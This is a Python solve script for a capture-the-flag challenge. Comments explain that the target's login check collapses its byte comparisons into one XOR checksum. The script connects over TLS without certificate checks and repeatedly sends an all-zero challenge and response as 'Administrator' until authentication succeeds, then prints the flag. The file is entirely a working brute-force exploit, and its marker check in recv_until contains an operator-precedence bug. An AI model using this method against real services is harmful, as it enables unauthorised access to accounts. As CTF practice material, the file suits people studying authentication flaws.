import socket
import ssl
import time
import re
import sys

HOST = "dora-nulls.ctf.prgy.in"
PORT = 1337

# VULNERABILITY: verify_credential XORs all 8 byte-wise comparisons into ONE checksum.
# checksum = XOR_all(expected[i] ^ provided[i] ^ mask[i]) for i=0..7
# This collapses to: XOR_all(expected) ^ XOR_all(provided) ^ XOR_all(mask) == 0
# Probability 1/256 per attempt. With 4919 iterations, trivially brutable.

def connect():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    raw = socket.create_connection((HOST, PORT), timeout=15)
    return ctx.wrap_socket(raw, server_hostname=HOST)


def recv_until(sock, marker, timeout=8):
    """Receive data until marker is found or timeout."""
    sock.settimeout(timeout)
    buf = b""
    end_time = time.time() + timeout
    while time.time() < end_time:
        try:
            remaining = max(0.1, end_time - time.time())
            sock.settimeout(remaining)
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf += chunk
            if marker.encode() if isinstance(marker, str) else marker in buf:
                return buf
        except (socket.timeout, ssl.SSLError):
            break
    return buf


def sl(sock, msg):
    """Send a line."""
    sock.sendall((msg + "\n").encode())


print("[*] Connecting to dora-nulls...", flush=True)
sock = connect()

# Get banner + first menu
data = recv_until(sock, "choose ")
print("[*] Connected, got menu", flush=True)

# Login flow:
#   1. menu: send "1"
#   2. "challenge (hex): " -> send 16 hex chars (8 bytes)
#   3. "username: " -> send "Administrator"
#   4. server prints "server challenge: <hex>"
#   5. "response (hex): " -> send 16 hex chars
#   6. result: "authentication successful" or "authentication failed"
#   7. back to menu "choose "

CHALLENGE = "00" * 8
RESPONSE = "00" * 8

for attempt in range(1, 3000):
    try:
        # 1. Select login
        sl(sock, "1")
        recv_until(sock, "challenge (hex):")

        # 2. Send challenge
        sl(sock, CHALLENGE)
        recv_until(sock, "username:")

        # 3. Send username
        sl(sock, "Administrator")
        data = recv_until(sock, "response (hex):")

        # Extract server challenge for logging
        sc_match = re.search(rb'server challenge:\s*([0-9a-f]+)', data)
        server_challenge = sc_match.group(1).decode() if sc_match else "?"

        # 4. Send response
        sl(sock, RESPONSE)

        # 5. Read result until next menu
        result = recv_until(sock, "choose ")
        result_text = result.decode(errors="replace")

        if "successful" in result_text:
            print(f"\n{'='*60}", flush=True)
            print(f"[+] SUCCESS on attempt {attempt}!", flush=True)
            for line in result_text.strip().split("\n"):
                line = line.strip()
                if line:
                    print(f"  {line}", flush=True)
                if "flag" in line.lower():
                    print(f"\n[FLAG] {line}", flush=True)
            print(f"{'='*60}", flush=True)
            break
        else:
            if attempt <= 3 or attempt % 100 == 0:
                print(f"[*] Attempt {attempt}: failed (server_challenge={server_challenge})", flush=True)

    except Exception as e:
        print(f"[!] Error on attempt {attempt}: {e}", flush=True)
        # Reconnect
        try:
            sock.close()
        except:
            pass
        print("[*] Reconnecting...", flush=True)
        sock = connect()
        recv_until(sock, "choose ")
        print("[*] Reconnected", flush=True)

else:
    print("[-] Exhausted all attempts without success", flush=True)

try:
    sock.close()
except:
    pass
print("[*] Done", flush=True)
#  $env:PYTHONIOENCODING='utf-8'; python D:\LLLL\dora_solve2.py